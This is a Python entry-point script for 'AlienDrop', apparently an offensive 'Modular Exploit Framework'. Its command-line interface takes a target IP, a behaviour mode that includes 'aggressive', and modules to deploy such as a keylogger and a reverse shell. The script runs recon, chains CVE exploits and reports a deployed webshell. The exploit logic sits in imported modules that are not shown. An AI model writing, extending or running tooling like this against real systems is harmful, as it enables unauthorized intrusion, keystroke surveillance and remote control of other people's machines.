 # App entrypoint, CLI or GUI launch



# MINC - AlienDrop Core Entry Point

import argparse

from exploit_dispatcher import dispatch_exploit_chain

from recon.recon_engine import perform_recon

from modules.taskcli import launch_task_cli

from dashboard.operator import OperatorDashboardLauncher



def main():

    parser = argparse.ArgumentParser(description="AlienDrop: Modular Exploit Framework")

    parser.add_argument("--target", help="Single IP to scan + deploy on")

    parser.add_argument("--attitude", choices=["passive", "monitor", "aggressive"], help="Drop behavior mode")

    parser.add_argument("--functionality", nargs="+", help="Modules to deploy (keylogger, reverse_shell, recon, etc)")

    parser.add_argument("--cli", action="store_true", help="Launch task manager CLI")

    parser.add_argument("--gui", action="store_true", help="Launch operator dashboard")



    args = parser.parse_args()



    if args.gui:

        OperatorDashboardLauncher().launch()

    elif args.cli:

        launch_task_cli()

    elif args.target:

        print(f"[+] Starting full recon → CVE chain → shell drop on {args.target}")

        recon_data = perform_recon(args.target)

        shell_id = dispatch_exploit_chain(

            target=args.target,

            recon_data=recon_data,

            attitude=args.attitude or "passive",

            modules=args.functionality or ["reverse_shell"]

        )

        print(f"[+] Webshell deployed with ID: {shell_id}")

    else:

        parser.print_help()



if __name__ == "__main__":

    main()
